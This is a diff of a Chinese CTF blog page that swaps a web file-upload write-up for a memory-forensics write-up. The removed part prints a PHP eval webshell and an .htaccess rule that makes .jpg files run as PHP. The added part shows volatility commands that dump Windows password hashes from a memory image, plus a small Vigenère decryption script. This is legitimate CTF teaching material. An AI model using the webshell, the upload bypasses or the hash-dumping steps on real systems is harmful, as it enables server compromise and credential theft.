@@ -20,33 +20,35 @@
     var CONFIG = {"hostname":"yichennet.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false,"b2t":true,"scrollpercent":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="http:&#x2F;&#x2F;123.57.233.79:2222&#x2F; upload实战方法一：.htaccess绕过 探测会不会存在更换文件名  发现，不会改变，那么尝试上传.htaccess.htaccess代码如下 1AddType application&#x2F;x-httpd-php .jpg   发现可以正常上传（没有做过滤），那么事情就简单了  上传一句话一句话代码如下 12&lt;?php @eval($_">
+  <meta name="description" content="题目：内存取证来源：sysctf本题涉及的知识点： 内存取证 维吉尼亚密码 解题思路：利用内存取证神器volatility，取得flag">
 <meta property="og:type" content="article">
-<meta property="og:title" content="http:&#x2F;&#x2F;123.57.233.79:2222&#x2F; upload实战">
-<meta property="og:url" content="https://yichennet.github.io/2020/07/22/CTF-%E9%A2%98%E7%9B%AE/http123.57.233.792222%20upload%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:title" content="内存取证">
+<meta property="og:url" content="https://yichennet.github.io/2020/08/05/CTF-%E9%A2%98%E7%9B%AE/Misc/%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/index.html">
 <meta property="og:site_name" content="逸晨のBlog">
-<meta property="og:description" content="http:&#x2F;&#x2F;123.57.233.79:2222&#x2F; upload实战方法一：.htaccess绕过 探测会不会存在更换文件名  发现，不会改变，那么尝试上传.htaccess.htaccess代码如下 1AddType application&#x2F;x-httpd-php .jpg   发现可以正常上传（没有做过滤），那么事情就简单了  上传一句话一句话代码如下 12&lt;?php @eval($_">
+<meta property="og:description" content="题目：内存取证来源：sysctf本题涉及的知识点： 内存取证 维吉尼亚密码 解题思路：利用内存取证神器volatility，取得flag">
 <meta property="og:locale" content="zh—CN">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg3s3ef5j31bw04xdh2.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg6grh1wj314s04swf9.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg9hk7brj31ej0l6jw6.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgafs3d7j316s0s20xc.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgga5pjyj317k0mtadv.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgjvpo5kj317i0dagoa.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzglhfoesj31240mujw5.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgpw6waij314a068ab1.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgs4ygu5j30lg023dfq.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgtc8y06j31810e90vc.jpg">
-<meta property="article:published_time" content="2020-07-22T01:07:00.575Z">
-<meta property="article:modified_time" content="2020-07-22T06:49:03.019Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxsieqptj314d09mgml.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxvc7vl8j30z50crmy5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxwm7ze2j312f07rgm3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfy7tp968j30pf03oglq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfyfkncj4j312p0ekwgo.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfyhypc8jj309w02u0sn.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfypqfsepj31av0s2whp.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfywxs5swj30ja0ivn0k.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfyzw6ffkj30wr0a775s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfz27vf1fj30ww02haa9.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfz4adn0gj30dy02i0sl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfz64qdv7j30bk0hv0sv.jpg">
+<meta property="article:published_time" content="2020-08-05T07:42:22.000Z">
+<meta property="article:modified_time" content="2020-08-05T07:46:51.938Z">
 <meta property="article:author" content="逸晨">
 <meta property="article:tag" content="信息安全">
 <meta property="article:tag" content="CTF-题目">
-<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="MISC">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg3s3ef5j31bw04xdh2.jpg">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxsieqptj314d09mgml.jpg">
 
-<link rel="canonical" href="https://yichennet.github.io/2020/07/22/CTF-%E9%A2%98%E7%9B%AE/http123.57.233.792222%20upload%E5%AE%9E%E6%88%98/">
+<link rel="canonical" href="https://yichennet.github.io/2020/08/05/CTF-%E9%A2%98%E7%9B%AE/Misc/%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
 
 
 <script id="page-configurations">
@@ -59,7 +61,7 @@
   };
 </script>
 
-  <title>http://123.57.233.79:2222/ upload实战 | 逸晨のBlog</title>
+  <title>内存取证 | 逸晨のBlog</title>
   
 
 
@@ -208,7 +210,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh—CN">
-    <link itemprop="mainEntityOfPage" href="https://yichennet.github.io/2020/07/22/CTF-%E9%A2%98%E7%9B%AE/http123.57.233.792222%20upload%E5%AE%9E%E6%88%98/">
+    <link itemprop="mainEntityOfPage" href="https://yichennet.github.io/2020/08/05/CTF-%E9%A2%98%E7%9B%AE/Misc/%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/tx.jpeg">
@@ -221,7 +223,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          http://123.57.233.79:2222/ upload实战
+          内存取证
         </h1>
 
         <div class="post-meta">
@@ -232,7 +234,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-07-22 09:07:00 / 修改时间：14:49:03" itemprop="dateCreated datePublished" datetime="2020-07-22T09:07:00+08:00">2020-07-22</time>
+              <time title="创建时间：2020-08-05 15:42:22 / 修改时间：15:46:51" itemprop="dateCreated datePublished" datetime="2020-08-05T15:42:22+08:00">2020-08-05</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -260,8 +262,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/07/22/CTF-%E9%A2%98%E7%9B%AE/http123.57.233.792222%20upload%E5%AE%9E%E6%88%98/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/07/22/CTF-%E9%A2%98%E7%9B%AE/http123.57.233.792222%20upload%E5%AE%9E%E6%88%98/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/08/05/CTF-%E9%A2%98%E7%9B%AE/Misc/%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/05/CTF-%E9%A2%98%E7%9B%AE/Misc/%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -271,7 +273,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>654</span>
+              <span>1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -290,45 +292,57 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="http-123-57-233-79-2222-upload实战"><a href="#http-123-57-233-79-2222-upload实战" class="headerlink" title="http://123.57.233.79:2222/ upload实战"></a><a href="http://123.57.233.79:2222/" target="_blank" rel="noopener">http://123.57.233.79:2222/</a> upload实战</h2><h3 id="方法一：-htaccess绕过"><a href="#方法一：-htaccess绕过" class="headerlink" title="方法一：.htaccess绕过"></a>方法一：.htaccess绕过</h3><ol>
-<li><h4 id="探测会不会存在更换文件名"><a href="#探测会不会存在更换文件名" class="headerlink" title="探测会不会存在更换文件名"></a>探测会不会存在更换文件名</h4><p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg3s3ef5j31bw04xdh2.jpg" alt="1"></p>
-</li>
-<li><h4 id="发现，不会改变，那么尝试上传-htaccess"><a href="#发现，不会改变，那么尝试上传-htaccess" class="headerlink" title="发现，不会改变，那么尝试上传.htaccess"></a>发现，不会改变，那么尝试上传.htaccess</h4><p>.htaccess代码如下</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg6grh1wj314s04swf9.jpg" alt="2"></p>
-<p>发现可以正常上传（没有做过滤），那么事情就简单了</p>
-</li>
-<li><h4 id="上传一句话"><a href="#上传一句话" class="headerlink" title="上传一句话"></a>上传一句话</h4><p>一句话代码如下</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"pass"</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>直接将图片命名成为.jpg，由此可以说明，本题并有没有做头文件检测</p>
+        <h2 id="题目：内存取证"><a href="#题目：内存取证" class="headerlink" title="题目：内存取证"></a>题目：内存取证</h2><p>来源：sysctf<br>本题涉及的知识点：</p>
+<p>内存取证</p>
+<p>维吉尼亚密码</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>利用内存取证神器<code>volatility</code>，取得flag</p>
 <a id="more"></a>
 
-<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzg9hk7brj31ej0l6jw6.jpg" alt="12"></p>
-<p>成功上传</p>
-<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgafs3d7j316s0s20xc.jpg" alt="123"></p>
-</li>
-</ol>
-<h3 id="方法二：文件解析漏洞"><a href="#方法二：文件解析漏洞" class="headerlink" title="方法二：文件解析漏洞"></a>方法二：文件解析漏洞</h3><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>​    因为第一种成功拿到phpinfo，就可以判断他是一个apache解析，不需要去测试他的解析环境</p>
-<p>​    从Server API中即可看出</p>
-<p>​    <img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgga5pjyj317k0mtadv.jpg" alt="4"></p>
-<p>​    并且，从源码中可以看出这是一个做了黑名单过滤的题目</p>
-<p>​    <img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgjvpo5kj317i0dagoa.jpg" alt="12123"></p>
-<p>​    那我就从apache解析漏洞的原理出发</p>
-<blockquote>
-<p>Apache是从<strong>右到左</strong>开始判断<strong>解析</strong>，如果为不可识别解析,就再往左判断</p>
-</blockquote>
-<h4 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h4><p>​    <img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzglhfoesj31240mujw5.jpg" alt="dad"></p>
-<p>​    成功上传并解析</p>
-<h3 id="方法三：配合系统文件命名规则"><a href="#方法三：配合系统文件命名规则" class="headerlink" title="方法三：配合系统文件命名规则"></a>方法三：配合系统文件命名规则</h3><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>​    从第一种phpinfo中得知，这是一个基础linux下的环境，那么就可以考虑linux下不区分文件名后缀大小写的原则</p>
-<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgpw6waij314a068ab1.jpg" alt="123"></p>
-<p>​    如果不知情的话，可以考虑win和linux下都试试</p>
-<h4 id="复现：-1"><a href="#复现：-1" class="headerlink" title="复现："></a>复现：</h4><p>​    尝试上传</p>
-<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgs4ygu5j30lg023dfq.jpg" alt="123"></p>
-<p>​    去解析一下</p>
-<p>​    <img src="http://ww1.sinaimg.cn/large/006ZDEGPgy1ggzgtc8y06j31810e90vc.jpg" alt="sas"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一道题，采用了不同的方法去实现，开拓了自己的知识面，第一次复现使用apache解析漏洞和系统文件名的绕过，但是因为php版本原因，不能尝试00截断的方式去做出本题，但是感觉条件竞争还是有可能实现的</p>
+<h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><p>先获取镜像信息，并判断类型</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f imageinfo ?.img<span class="regexp">/raw/</span>...</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxsieqptj314d09mgml.jpg" alt="镜像"></p>
+<p>在扫描所有的文件列表(一般会结合grep)</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f <span class="module-access"><span class="module"><span class="identifier">CTF</span>.</span></span>raw --profile=WinXPSP2x86 filescan</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxvc7vl8j30z50crmy5.jpg" alt="test"></p>
+<p>拉到最下面，发现一个可疑文件</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfxwm7ze2j312f07rgm3.jpg" alt="dump"></p>
+<p>它居然让我下它（正常不会出现这种情况）</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f 下载<span class="string">/CTF.raw</span> <span class="params">--profile=Win7SP1x64</span> memdump -p 676 -D .</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfy7tp968j30pf03oglq.jpg" alt="base"></p>
+<p>下载完成，再用<code>binwalk</code>发现文件贼多</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfyfkncj4j312p0ekwgo.jpg" alt="123"></p>
+<p>既然这么多文件，那么为啥不<code>foremost</code>一下发现惊喜呢</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfyhypc8jj309w02u0sn.jpg" alt="flag"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfypqfsepj31av0s2whp.jpg" alt="123"></p>
+<p>方法一（不适用）：</p>
+<p>利用ARCHPR爆破</p>
+<p>取得key为：admin</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfywxs5swj30ja0ivn0k.jpg" alt="test"></p>
+<p>方法二：</p>
+<p>一般这种密码可能为管理员密码，而且我也检测过了文件中的其他文件，找不到密码，那我们就试试管理员密码</p>
+<p>上才艺</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f 下载<span class="string">/CTF.raw</span> <span class="params">--profile=Win7SP1x64</span> hivelist</span><br></pre></td></tr></table></figure>
+
+<p>找到system与sam</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfyzw6ffkj30wr0a775s.jpg" alt="密码"></p>
+<p>最后在把密码hash出来</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f 下载/CTF.raw --profile=Win7SP1x64 hashdump -y <span class="number">0xfffff8a000024010</span> -s <span class="number">0xfffff8a0007c3010</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfz27vf1fj30ww02haa9.jpg" alt="hash"></p>
+<p>把admin的密码丢去解密</p>
+<p>解得：admin</p>
+<p>打开压缩文件，这感觉就是实验室的味道</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfz4adn0gj30dy02i0sl.jpg" alt="flag"></p>
+<p>看到了s与f,有点像维吉尼亚密码</p>
+<p>拿到网上跑一下试试</p>
+<p><img src="http://ww1.sinaimg.cn/large/006ZDEGPly1ghfz64qdv7j30bk0hv0sv.jpg" alt="get"></p>
+<p>解得sysctf{RH_Want_a_Girl_Friend}</p>
+<h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><p>自己写了针对本题的维吉尼亚密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密方法</span></span><br><span class="line"><span class="comment"># 解密公式：P = (C - K)%26</span></span><br><span class="line"><span class="comment"># C：密文</span></span><br><span class="line"><span class="comment"># P：原文</span></span><br><span class="line"><span class="comment"># K：第几套加密方式</span></span><br><span class="line"></span><br><span class="line">enflag=<span class="string">"sbekgf&#123;UT_Ennw_m_Ovro_Rzveqp&#125;"</span></span><br><span class="line">key=<span class="string">"admin"</span></span><br><span class="line">key_list=<span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">len(key)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">enflag=enflag.lower()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enflag:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> key_list:</span><br><span class="line">        p=(ord(i)-ord(key[num])) %<span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span> p&lt;<span class="number">0</span>:</span><br><span class="line">            p+=<span class="number">26</span></span><br><span class="line">        flag+=chr(p+<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> num==<span class="number">4</span>:</span><br><span class="line">            num=<span class="number">-1</span></span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=i</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -340,7 +354,7 @@
           <div class="post-tags">
               <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
               <a href="/tags/CTF-%E9%A2%98%E7%9B%AE/" rel="tag"># CTF-题目</a>
-              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/MISC/" rel="tag"># MISC</a>
           </div>
 
         
@@ -349,13 +363,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/07/20/CTF-%E9%A2%98%E7%9B%AE/buuctf-%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/" rel="prev" title="buuctf-[强网杯 2019]随便注 1">
-      <i class="fa fa-chevron-left"></i> buuctf-[强网杯 2019]随便注 1
+    <a href="/2020/08/05/CTF-%E9%A2%98%E7%9B%AE/Misc/%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AA%E4%B8%96%E7%95%8C/" rel="prev" title="另外一个世界">
+      <i class="fa fa-chevron-left"></i> 另外一个世界
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/07/22/CTF-%E9%A2%98%E7%9B%AE/BUUCTF-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL1/" rel="next" title="BUUCTF-[极客大挑战 2019]EasySQL1">
-      BUUCTF-[极客大挑战 2019]EasySQL1 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -415,7 +426,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#http-123-57-233-79-2222-upload实战"><span class="nav-number">1.</span> <span class="nav-text">http:&#x2F;&#x2F;123.57.233.79:2222&#x2F; upload实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一：-htaccess绕过"><span class="nav-number">1.1.</span> <span class="nav-text">方法一：.htaccess绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#探测会不会存在更换文件名"><span class="nav-number">1.1.1.</span> <span class="nav-text">探测会不会存在更换文件名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#发现，不会改变，那么尝试上传-htaccess"><span class="nav-number">1.1.2.</span> <span class="nav-text">发现，不会改变，那么尝试上传.htaccess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传一句话"><span class="nav-number">1.1.3.</span> <span class="nav-text">上传一句话</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二：文件解析漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">方法二：文件解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#思路："><span class="nav-number">1.2.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现："><span class="nav-number">1.2.2.</span> <span class="nav-text">复现：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法三：配合系统文件命名规则"><span class="nav-number">1.3.</span> <span class="nav-text">方法三：配合系统文件命名规则</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#思路：-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#复现：-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">复现：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目：内存取证"><span class="nav-number">1.</span> <span class="nav-text">题目：内存取证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路："><span class="nav-number">1.1.</span> <span class="nav-text">解题思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题步骤："><span class="nav-number">1.2.</span> <span class="nav-text">解题步骤：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拓展："><span class="nav-number">1.3.</span> <span class="nav-text">拓展：</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -431,7 +442,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -504,12 +515,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">121k</span>
+    <span title="站点总字数">125k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:50</span>
+    <span title="站点阅读时长">1:53</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
